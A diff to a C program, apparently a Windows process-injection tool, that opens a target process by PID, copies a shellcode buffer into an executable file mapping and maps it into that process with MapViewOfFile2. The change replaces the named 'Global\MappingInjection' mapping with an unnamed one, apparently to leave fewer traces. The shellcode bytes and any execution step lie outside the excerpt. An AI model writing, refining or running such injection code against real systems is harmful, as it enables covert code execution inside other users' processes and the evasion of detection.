@@ -36,7 +36,6 @@ unsigned char shellcode[] =
 int main(int argc, char** argv)
 {
 	int targetProcess;
-	char mappingName[] = "Global\\MappingInjection";
 	if (argc < 2) {
 		printf("First argument must be PID of the target process");
 		return -1;
@@ -51,13 +50,13 @@ int main(int argc, char** argv)
 		printf("\nCannot open process with PID %d\n", targetProcess);
 		return -1;
 	}
-	HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), mappingName);
+	HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL);
 	if (hFileMap == NULL)
 	{
 		printf("\nCreateFileMapping failed with error: %d\n", GetLastError());
 		return -1;
 	}
-	printf("\nCreated global file mapping object with name %s\n", mappingName);
+	printf("\nCreated global file mapping object\n");
 	LPVOID lpMapAddress = MapViewOfFile(hFileMap, FILE_MAP_WRITE, 0, 0, sizeof(shellcode));
 	if (lpMapAddress == NULL)
 	{
@@ -65,7 +64,7 @@ int main(int argc, char** argv)
 		return -1;
 	}
 	memcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode));
-	printf("\nWritten %d bytes to the global mapping object %s\n", (DWORD)sizeof(shellcode), mappingName);
+	printf("\nWritten %d bytes to the global mapping object\n", (DWORD)sizeof(shellcode));
 	LPVOID lpMapAddressRemote = MapViewOfFile2(hFileMap, hProc, 0, NULL, 0, 0, PAGE_EXECUTE_READ);
 	if (lpMapAddressRemote == NULL)
 	{
